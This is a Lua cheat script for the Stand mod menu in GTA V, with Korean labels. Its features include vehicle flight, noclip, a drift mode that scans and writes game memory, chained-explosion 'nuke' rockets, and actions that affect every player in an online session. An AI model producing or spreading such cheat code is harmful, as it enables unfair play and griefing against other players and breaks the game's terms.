	["GET_VEHICLE_PED_IS_IN"]=function(--[[Ped (int)]] ped,--[[BOOL (bool)]] includeLastVehicle)native_invoker.begin_call();native_invoker.push_arg_int(ped);native_invoker.push_arg_bool(includeLastVehicle);native_invoker.end_call("9A9112A0FE9A4713");return native_invoker.get_return_value_int();end,
}
PLAYERR = {
	["PLAYER_PED_ID"]=function()native_invoker.begin_call();native_invoker.end_call("D80958FC74E988A6");return native_invoker.get_return_value_int();end,
}
CAMM = {
	["GET_GAMEPLAY_CAM_ROT"]=function(--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("837765A25378F0BB");return native_invoker.get_return_value_vector3();end,
	["SET_CAM_ROT"]=--[[void]] function(--[[Cam (int)]] cam,--[[float]] rotX,--[[float]] rotY,--[[float]] rotZ,--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(cam);native_invoker.push_arg_float(rotX);native_invoker.push_arg_float(rotY);native_invoker.push_arg_float(rotZ);native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("85973643155D0B07");end,
	["_SET_GAMEPLAY_CAM_RELATIVE_ROTATION"]=--[[void]] function(--[[float]] roll,--[[float]] pitch,--[[float]] yaw)native_invoker.begin_call();native_invoker.push_arg_float(roll);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(yaw);native_invoker.end_call("48608C3464F58AB4");end,

}
ENTITYY = {
	["SET_ENTITY_ROTATION"]=function(--[[Entity (int)]] entity,--[[float]] pitch,--[[float]] roll,--[[float]] yaw,--[[int]] rotationOrder,--[[BOOL (bool)]] p5)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(roll);native_invoker.push_arg_float(yaw);native_invoker.push_arg_int(rotationOrder);native_invoker.push_arg_bool(p5);native_invoker.end_call("8524A8B0171D5E07");end,
	["SET_ENTITY_COLLISION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle,--[[BOOL (bool)]] keepPhysics)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.push_arg_bool(keepPhysics);native_invoker.end_call("1A9205C1B9EE827F");end,
	["APPLY_FORCE_TO_ENTITY"]=function(--[[Entity (int)]] entity,--[[int]] forceFlags,--[[float]] x,--[[float]] y,--[[float]] z,--[[float]] offX,--[[float]] offY,--[[float]] offZ,--[[int]] boneIndex,--[[BOOL (bool)]] isDirectionRel,--[[BOOL (bool)]] ignoreUpVec,--[[BOOL (bool)]] isForceRel,--[[BOOL (bool)]] p12,--[[BOOL (bool)]] p13)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_int(forceFlags);native_invoker.push_arg_float(x);native_invoker.push_arg_float(y);native_invoker.push_arg_float(z);native_invoker.push_arg_float(offX);native_invoker.push_arg_float(offY);native_invoker.push_arg_float(offZ);native_invoker.push_arg_int(boneIndex);native_invoker.push_arg_bool(isDirectionRel);native_invoker.push_arg_bool(ignoreUpVec);native_invoker.push_arg_bool(isForceRel);native_invoker.push_arg_bool(p12);native_invoker.push_arg_bool(p13);native_invoker.end_call("C5F68BE9613E2D18");end,
	["FREEZE_ENTITY_POSITION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.end_call("428CA6DBD1094446");end,
}
VEHICLEE = {
	["SET_VEHICLE_FORWARD_SPEED"]=function(--[[Vehicle (int)]] vehicle,--[[float]] speed)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_float(speed);native_invoker.end_call("AB54A438726D25D5");end,
	["SET_VEHICLE_GRAVITY"]=function(--[[Vehicle (int)]] vehicle,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_bool(toggle);native_invoker.end_call("89F149B6131E57DA");end,
	["SET_VEHICLE_EXTRA_COLOURS"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] pearlescentColor,--[[int]] wheelColor)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(pearlescentColor);native_invoker.push_arg_int(wheelColor);native_invoker.end_call("2036F561ADD12E33");end,

}
PADD = {
	["IS_CONTROL_PRESSED"]=function(--[[int]] padIndex,--[[int]] control)native_invoker.begin_call();native_invoker.push_arg_int(padIndex);native_invoker.push_arg_int(control);native_invoker.end_call("F3A21BCD95725A4A");return native_invoker.get_return_value_bool();end,
}

veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
local is_vehicle_flying = false
local dont_stop = false
local no_collision = false
local speed = 6
local reset_veloicty = false

menu.toggle(sportmode, "차량 비행", {"vehfly"}, "나는 네가 이 명령어에 단축키를 넣는 것을 추천한다.", function(on_click)
    is_vehicle_flying = on_click
    if reset_veloicty then 
        ENTITYY.FREEZE_ENTITY_POSITION(veh, true)
        util.yield()
        ENTITYY.FREEZE_ENTITY_POSITION(veh, false)
    end
end)
menu.slider(sportmode, "속도", {}, "", 1, 100, 6, 1, function(on_change)
    speed = on_change
end)
menu.toggle(sportmode, "비행 가속화", {}, "차량 비행 가속도를 활성화", function(on_click)
    dont_stop = on_click
end)
menu.toggle(sportmode, "스피드 리셋", {}, "껐다가 계속 움직이면 여기로 쳐봐", function(on_click)
    reset_veloicty = on_click
end)
menu.toggle(sportmode, "노클립 버전", {}, "", function(on_click)
    no_collision = on_click
end)


vehicleroll = 0


function do_vehicle_fly()
    veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
    cam_pos = CAMM.GET_GAMEPLAY_CAM_ROT(0);
    ENTITYY.SET_ENTITY_ROTATION(veh, cam_pos.x, vehicleroll, cam_pos.z, 2, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, not no_collision, true);
    if PADD.IS_CONTROL_PRESSED(0, 108) then 
        vehicleroll = vehicleroll -1
    end

    if PADD.IS_CONTROL_PRESSED(0, 109) then 
        vehicleroll = vehicleroll +1
       
    end

    local locspeed = speed*10
    local locspeed2 = speed
    if PADD.IS_CONTROL_PRESSED(0, 61) then 
        locspeed = locspeed*2
        locspeed2 = locspeed2*2
    end

    
    if PADD.IS_CONTROL_PRESSED(2, 71) then
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 72) then
		local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed * 2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
        end
   end
    if PADD.IS_CONTROL_PRESSED(2, 63) then
        local lsp = (0 - speed)*2
        if not PADD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = 0 - speed
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 64) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed*2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
	if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
        VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
    end
end


util.create_tick_handler(function() 


    -- Added by LAZ
    if PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(),false) == 0 then
        if is_vehicle_flying then
            menu.trigger_commands("vehfly")
            util.toast("정지상태야, 차 안에 있는 게 아니야.")
        end
    else
        if is_vehicle_flying then do_vehicle_fly() end


    end

    -- End Added by LAZ

    VEHICLEE.SET_VEHICLE_GRAVITY(veh, not is_vehicle_flying) 
    if not is_vehicle_flying then 
        ENTITY.SET_ENTITY_COLLISION(veh, true, true);
    end

    return true
end)

util.on_stop(function() 
    VEHICLEE.SET_VEHICLE_GRAVITY(veh, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, true, true);
end)

--------------------------------------------------------------------------------------------------------------------------------
-- Drift Mode Start

local function getCurrentVehicle() 
	local player_id = PLAYER.PLAYER_ID()
	local player_ped = PLAYER.GET_PLAYER_PED(player_id)
    local player_vehicle = 0
    if (PED.IS_PED_IN_ANY_VEHICLE(player_ped)) then
        veh = PED.GET_VEHICLE_PED_IS_USING(player_ped)
        if (NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh)) then
            player_vehicle = veh
        end 
    end
    return player_vehicle
end

local function getHeadingOfTravel(veh) 
    local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
    local x = velocity.x
    local y = velocity.y
    local at2 = math.atan(y, x)
    return math.fmod(270.0 + math.deg(at2), 360.0)
end

local function slamDatBitch(veh, height) 
    if (VEHICLE.IS_VEHICLE_ON_ALL_WHEELS(veh) and not ENTITY.IS_ENTITY_IN_AIR(veh)) then
     
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1,    0, 0, height,    0, 0, 0,   true, true)
    end
end

local function getCurGear()
    return memory.read_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(CurrentGearOffset))
end

local function getNextGear()
    return memory.read_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(NextGearOffset))
end

local function setCurGear(gear)
    memory.write_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(CurrentGearOffset), gear)
end

local function setNextGear(gear)
    memory.write_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(NextGearOffset), gear)
end

local function asDegrees(angle)
    return angle * (180.0 / 3.14159265357); 
end

local function wrap360(val) 
    --    this may be the same as:
    --      return math.fmod(val + 360, 360)
    --    but wierd things happen
    while (val < 0.0) do
        val = val + 360.0
    end
    while (val > 360.0) do
        val = val - 360.0
    end
    return val
end

driftmodee = menu.list(vehicles, "드리프트 모드", {}, "원주민 기반 드리프트 모드 :'3")

local gs_driftMinSpeed = 8.0
local gs_driftMaxAngle = 50.0
local ControlVehicleAccelerate = 71
local ControlVehicleBrake = 72
local ControlVehicleDuck = 73
local ControlVehicleSelectNextWeapon = 99
local ControlVehicleMoveUpOnly = 61
local INPUT_FRONTEND_LS = 209
local DriftActivateKeyboard = INPUT_FRONTEND_LS

CurrentGearOffset = memory.scan("A8 02 0F 84 ? ? ? ? 0F B7 86")+11
NextGearOffset = memory.scan("A8 02 0F 84 ? ? ? ? 0F B7 86")+18

local isDrifting      = 0
local wasDrifting     = 0
local isDriftFinished = 1
local prevGripState   = 0
local lastDriftAngle  = 0.0
local oldGripState    = 0
local debug_notification = 0

textDrawCol = {
    r = 255,
    g = 255,
    b = 255,
    a = 255
}



local function driftmod_ontick() 
    local player = players.user()
    local veh = getCurrentVehicle()
   

    local inVehicle   = veh ~= 0
    local isDriving   = true

    local mps = ENTITY.GET_ENTITY_SPEED(veh)
    local mph       = mps * 2.23694
    local kmh       = mps * 3.6

    if inVehicle and isDriving and not isDrifting and not isDriftFinished then
        isDriftFinished = true
    end

    if not inVehicle or not isDriving then
        return
    end

    local driftKeyPressed = PAD.IS_CONTROL_PRESSED(2, ControlVehicleDuck) or PAD.IS_DISABLED_CONTROL_PRESSED(2, ControlVehicleDuck) or PAD.IS_CONTROL_PRESSED(0, DriftActivateKeyboard) or PAD.IS_DISABLED_CONTROL_PRESSED(0, DriftActivateKeyboard)

    if (driftKeyPressed and getCurGear(veh) > 2) then
        setCurGear(2)
        setNextGear(2)
    end
    if driftKeyPressed then
         
        if (PAD.GET_CONTROL_NORMAL(2, ControlVehicleBrake) > 0.1) then
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, ControlVehicleBrake, 0)
            local neg = -0.3

            if (PAD.IS_CONTROL_PRESSED(2, ControlVehicleSelectNextWeapon)) then
                neg = 10
            end

            slamDatBitch(veh, neg * 1 * PAD.GET_CONTROL_NORMAL(2, ControlVehicleBrake))
        end 

        local angleOfTravel  = getHeadingOfTravel(veh)
        local angleOfHeading = ENTITY.GET_ENTITY_HEADING_FROM_EULERS(veh)
        
        local driftAngle = angleOfHeading - angleOfTravel

        if driftAngle and lastDriftAngle then
            local diff = driftAngle - lastDriftAngle

            if diff > 180.0 then
                driftAngle = driftAngle - 360.0
            end
            if diff < 180.0 then
                driftAngle = driftAngle - 360.0
            end
        end

        driftAngle     = wrap360(driftAngle)
        lastDriftAngle = driftAngle

        local zeroBasedDriftAngle = 360 - driftAngle
        if zeroBasedDriftAngle > 180 then
            zeroBasedDriftAngle = 0 - (360 - zeroBasedDriftAngle)
        end

        directx.draw_text(0,0,"Drift Angle: " .. math.floor(zeroBasedDriftAngle) .. "°", ALIGN_TOP_CENTRE,1,textDrawCol)
        local done = false
        if ((isDrifting or kmh > gs_driftMinSpeed) and (math.abs(driftAngle - 360.0) < gs_driftMaxAngle) or (driftAngle < gs_driftMaxAngle)) then
            isDrifting      = 1
            isDriftFinished = 1;  -- Doesn't get set to 0 until isDrifting is 0.

            if driftKeyPressed then
                 
                if driftKeyPressed ~= oldGripState then
                    VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, driftKeyPressed)
                    oldGripState = driftKeyPressed
                end
            end
            done = true
        end

        if not done and kmh < gs_driftMinSpeed then
            if driftKeyPressed then
                if driftKeyPressed ~= oldGripState then
                    VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, driftKeyPressed)
                    oldGripState = driftKeyPressed
                end
            end
            done = true
        end

        if not done then
            if driftKeyPressed == oldGripState then
                VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
                oldGripState = 0
            end

            if math.abs(zeroBasedDriftAngle) > gs_driftMaxAngle then
                if zeroBasedDriftAngle > 0 then
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 0, true)
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 1, false)

                 
                    util.toast("좌측 카운터 스티어링")
                    
                    VEHICLE.SET_VEHICLE_STEER_BIAS(veh, math.rad(zeroBasedDriftAngle * 0.69))
              
                else
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 1, true)
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 0, false)
              

                    util.toast("우측 카운터 스티어링")

                    VEHICLE.SET_VEHICLE_STEER_BIAS(veh, math.rad(zeroBasedDriftAngle * 0.69))
      
                end
            end
		else 
			VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 0, false)
			VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 1, false)
        end
    end

    if not driftKeyPressed and prevGripState then
        isDrifting      = 0
        isDriftFinished = 0
        lastDriftAngle = 0

        if driftKeyPressed ~= oldGripState then
            VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, driftKeyPressed)
            oldGripState = driftKeyPressed
        end
    end

    prevGripState = driftKeyPressed
    if isDrifting ~= wasDrifting then
        wasDrifting     = isDrifting
        changedDrifting = true
    end
end


menu.toggle_loop(driftmodee,"드리프트 모드", {},"드리프트하려면 SHIFT를 누릅니다.",function(on)
	driftmod_ontick()
end)
driftSetings = menu.list(driftmodee, "설정", {}, "")

menu.slider(driftSetings,"최소 속도 /100", {}, "/100", 0, 10000, gs_driftMinSpeed*100, 1, function(on)
    gs_driftMinSpeed = on/100
end)

menu.slider(driftSetings,"최대 각도 /100", {}, "/100", 0, 10000,gs_driftMaxAngle*100, 1, function(on)
    gs_driftMaxAngle = on/100
end)

menu.colour(driftSetings,"텍스트 색상", {}, "", textDrawCol,true , function(newCol)
    textDrawCol = newCol
end)



--------------------------------------------------------------------------------------------------------------------------------
-- Diversion

menu.toggle(fun, "테슬라 조종사", {}, "차량을 생성하고 자동으로 운전을 합니다. 반자율 주행이니 운전에 집중하세요. \n웨이포인트가 사라지면 이후 랜덤으로 운전 합니다.", function(toggled)
    local ped = players.user_ped()
    local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    request_model(tesla_ai)
    request_model(tesla)
    if toggled then     
       if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            menu.trigger_commands("deletevehicle")
        end

        tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true) 
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(ped, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        menu.trigger_commands("performance")

        if HUD.IS_WAYPOINT_ACTIVE() then
            local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos.x, pos.y, pos.z, 20.0, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20.0, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            entities.delete_by_handle(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            entities.delete_by_handle(tesla_vehicle)
        end
    end
end)


local randomizer = function(x)
    local r = math.random(1,3)
    return x[r]
end

array = {"1","2","3"}

menu.action(fun, "방아쇠를 당기다", {}, "당신의 게임으로 러시아 룰렛을 연주하세요.", function()
    if randomizer(array) == "1" then
        util.toast("넌 살아남았어 :D")
    else
        util.log("네 게임은 끝났어 D:")
        menu.trigger_commands("yeet")
    end
end)

menu.action(fun, "눈싸움!!!", {}, "세션에 있는 플레이어에게 눈덩이를 줍니다", function ()
    local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        util.toast("이제 모두 눈덩이를 가졌어!")
        util.yield()
    end
   
end)

menu.toggle_loop(fun, "마스코트 고양이", {}, "", function()
    if not jinx_pet or not ENTITY.DOES_ENTITY_EXIST(jinx_pet) then
        local jinx = util.joaat("a_c_cat_01")
        request_model(jinx)
        local pos = players.get_position(players.user())
        jinx_pet = entities.create_ped(28, jinx, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(jinx_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(jinx_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(jinx_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(jinx_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(jinx_pet)
    jinx_pet = nil
end)




local jinx_army = {}
local army = menu.list(fun, "집사 공격", {}, "고양이를 데려와 고양이 많이!")
menu.click_slider(army, "집사 공격 G", {}, "집사의 심장 폭격을 합니다", 1, 256, 30, 1, function(val)
    local player = players.user_ped()
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local jinx = util.joaat("a_c_cat_01")
    request_model(jinx)
     for i = 1, val do
        jinx_army[i] = entities.create_ped(28, jinx, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(jinx_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(jinx_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(jinx_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(jinx_army[i], player, 0, -0.3, 0, 7.0, -1, 10, true)
        util.yield()
     end 
end)

menu.action(army, "청소하다 G", {}, "", function()
    for i, jinx in ipairs(jinx_army) do
        entities.delete_by_handle(jinx_army[i])
    end
end)

--colorizev_root = menu.list(fun, "Colorear coches", {"lancescriptcolorize"}, "Pinta los coches de alrededor!")

--custom_r = 254
--menu.slider(colorizev_root, "Custom R", {"colorizecustomr"}, "", 1, 255, 254, 1, function(s)
--    custom_r = s
--end)

--custom_g = 2
--menu.slider(colorizev_root, "Custom G", {"colorizecustomg"}, "", 1, 255, 2, 1, function(s)
--    custom_g = s
--end)

--custom_b = 252
--menu.slider(colorizev_root, "Custom B", {"colorizecustomb"}, "", 1, 255, 252, 1, function(s)
--    custom_b = s
--end)

--menu.action(colorizev_root, "RGB preset: Stand magenta", {"rpstandmagenta"}, "g", function(on_click)
--    menu.trigger_commands("colorizecustomr 254")
 --   menu.trigger_commands("colorizecustomg 2")
 --   menu.trigger_commands("colorizecustomb 252")
--end)

--menu.toggle(colorizev_root, "Colorize vehicles", {"colorizevehicles"}, "Colorizes all nearby vehicles with the valus you set! Turn on rainbow to RGB this ;", function(on)
--    if on then
--        colorize_cars = true
--        custom_rgb = true
--        mod_uses("vehicle", 1)
--    else
--        colorize_cars = false
--        custom_rgb = false
--        mod_uses("vehicle", -1)
--    end
--end, false)

--menu.toggle(colorizev_root, "Rainbow", {"rainbowvehicles"}, "Requires colorize vehicles to be turned on.", function(on)
--    if not colorize_cars then
--        menu.trigger_commands("colorizevehicles on")
--    end
--    custom_rgb = not on
--end, false)

armanuc = menu.list(fun, "RPG 옵션", {}, "")

local nuke_gun_toggle = menu.toggle(armanuc, "RPG 무기", {"JSnukeGun"}, "rpg는 nuclear을 발사한다.", function(toggle)
    nuke_running = toggle
    if nuke_running then
        if animals_running then menu.trigger_command(exp_animal_toggle, "off") end
        util.create_tick_handler(function()
            if WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) == -1312131151 then --if holding homing launcher
                if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                    if not remove_projectiles then 
                        remove_projectiles = true 
                        disableProjectileLoop(-1312131151)
                    end
                    util.create_thread(function()
                        local hash = util.joaat("w_arena_airmissile_01a")
                        STREAMING.REQUEST_MODEL(hash)
                        yieldModelLoad(hash)
                        local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)   
                        local dir, pos = direction()
                        local bomb = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos.x, pos.y, pos.z, true, true, false)
                        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                        ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do util.yield() end
                        local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                        entities.delete(bomb)
                        executeNuke(nukePos)
                    end)
                else
                    remove_projectiles = false
                end
            else
                remove_projectiles = false
            end
            return nuke_running
        end)
    end
end)

local nuke_height = 40
menu.slider(armanuc, "라누크 고원", {"JSnukeHeight"}, "nuclear 크기를 조정합니다", 10, 100, nuke_height, 10, function(value)
    nuke_height = value
end)

function executeNuke(pos)	
    for a = 0, nuke_height, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10, true, false, 1, false)	
        util.yield(50)
    end
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
end

--------------------------------------------------------------------------------------------------------------------------------
-- Misc
--local visual_stuff = {
--    {"Better Illumination", "AmbientPush"},
--    {"Oversaturated", "rply_saturation"},
--    {"Boost Everything", "LostTimeFlash"},
--    {"Foggy Night", "casino_main_floor_heist"},
--    {"Better Night Time", "dlc_island_vault"},
--    {"Normal Fog", "Forest"},
--    {"Heavy Fog", "nervousRON_fog"},
--    {"Firewatch", "MP_Arena_theme_evening"},
--    {"Warm", "mp_bkr_int01_garage"},
--    {"Deepfried", "MP_deathfail_night"},
--    {"Stoned", "stoned"},
--    {"Underwater", "underwater"},
--}

--local visual_fidelity = menu.list(misc, "Visuales", {}, "")
--for id, data in pairs(visual_stuff) do
--    local effect_name = data[1]
--    local effect_thing = data[2]
--    menu.toggle(visual_fidelity, effect_name, {""}, "", function(toggled)
--        if toggled then
--            GRAPHICS.SET_TIMECYCLE_MODIFIER(effect_thing)
--            menu.trigger_commands("shader apagaos")
--        else
--            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
--        end
--    end)
--end 

menu.hyperlink(misc, "디스코드 참여", "https://discord.gg/BNbSHhunPv")

menu.toggle(misc, "자동으로 닫기", {}, "gta에 들어갈 때 스크립트를 자동으로 닫습니다. \n활성화하면 로딩 시간이 길어질 수 있습니다.", function(on)
    if on then
        if not SCRIPT_MANUAL_START then
            util.stop_script()
        end
    end
end)

menu.toggle(misc, "스크린샷 모드", {}, "사진을 찍을 수 있도록 <3", function(on)
	if on then
		menu.trigger_commands("screenshot on")
	else
		menu.trigger_commands("screenshot off")
	end
end)

menu.toggle(misc, "스탠드 사용자 식별", {}, "다른 스탠드 사용자를 식별하지만 사용자도 식별할 수 있습니다.", function(on_toggle)
    local standid = menu.ref_by_path("Online>Protections>Detections>Stand User Identification")
    if on_toggle then
        menu.trigger_command(standid, "on")
    else
        menu.trigger_command(standid, "off")
    end
end)

menu.hyperlink(misc, "Github 참여", "https://github.com/xxpichoclesxx")

local credits = menu.list(misc, "신뢰 하는 사람들", {}, "")
local devcred = menu.list(credits, "개발에 도움을 준 사람들", {}, "")
local othercred = menu.list(credits, "이외 도움을 준 사람들", {}, "")
menu.action(devcred, "Aaron", {}, "스탠드 루아 API의 첫 단계를 도와주셔서 감사합니다.", function()
end)
menu.action(devcred, "gLance", {}, "그는 나에게 Gta V 네이티브들에게 많은 도움을 주었다.", function()
end)
menu.action(devcred, "LanceScriptTEOF", {}, "그는 나에게 Gta V 네이티브를 배우고 이해하도록 도왔습니다.", function()
end)
menu.action(devcred, "Cxbr", {}, "친근한 기능을 위한 <3", function()
end)
menu.action(devcred, "Sapphire", {}, "내가 바보 같기 때문에 거의 모든 기능을 인내심을 가지고 나를 도운 사람 <3", function()
end)
menu.action(devcred, "JinxScript/Prisuhm", {}, "prisuhm의 스키드 코드, 이것은 내가 그와 약간의 토론후 추가한 것입니다. 그가 거의 모든 단일 기능을 코딩했기 때문에 이 커뮤니티에서 그를 사랑합니다. \n고유하고 독특해서 감사합니다.", function()
end)
menu.action(othercred, "Emir, Joju, Pepe, Ady, Vicente, Sammy", {}, "이것은 그들 없이는 절대 불가능할 것이다. <3", function()
end)
menu.action(othercred, "Wigger", {}, "그는 스크립트에 아이디어와 기능을 가져왔습니다.", function()
end)
menu.action(othercred, "Ducklett", {}, "모든 스크립트를 영어로 번역 번역했습니다.", function()
end)
menu.action(othercred, "HADES", {}, "모든 스크립트를 한국어로 완전히 번역했습니다.", function()
end)
menu.action(othercred, "You <3", {}, "스크립트를 다운로드하고 개선을 위한 아이디어를 제공하는 사용자 <3", function()
end)

util.on_stop(function ()
    VEHICLE.SET_VEHICLE_GRAVITY(veh, true)
    ENTITY.SET_ENTITY_COLLISION(veh, true, true);
    util.toast("아디우스~\n마음에 드셨기를 바랍니다 :3")
    util.toast("스크립트 종료... ")
end)

players.dispatch_on_join()
util.keep_running()
